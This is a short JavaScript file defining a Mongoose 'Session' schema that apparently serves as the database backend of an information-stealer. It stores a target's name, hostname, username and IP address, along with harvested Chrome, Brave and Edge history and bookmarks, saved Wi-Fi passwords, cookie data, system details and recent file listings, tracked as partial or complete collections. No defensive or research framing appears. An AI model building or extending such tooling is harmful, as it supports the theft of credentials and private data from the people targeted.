const mongoose = require('mongoose');

const SessionSchema = new mongoose.Schema({
  session_id: {
    type: String,
    required: true,
    unique: true,
    index: true
  },
  target_name: {
    type: String,
    default: null
  },
  device_info: {
    hostname: String,
    username: String,
    userdomain: String,
    ip_address: String,
    timestamp: String
  },
  status: {
    type: String,
    enum: ['partial', 'complete'],
    default: 'partial'
  },
  items_collected: [{
    type: String
  }],
  data: {
    chrome_history: [String],
    brave_history: [String],
    edge_history: [String],
    wifi_passwords: [{
      network: String,
      password: String
    }],
    system_info: mongoose.Schema.Types.Mixed,
    bookmarks: {
      chrome: [String],
      brave: [String],
      edge: [String]
    },
    cookies_info: mongoose.Schema.Types.Mixed,
    recent_files: [{
      name: String,
      location: String
    }]
  },
  created_at: {
    type: Date,
    default: Date.now
  },
  updated_at: {
    type: Date,
    default: Date.now
  }
});

// Update timestamp on save
SessionSchema.pre('save', function() {
  this.updated_at = Date.now();
});

module.exports = mongoose.model('Session', SessionSchema);
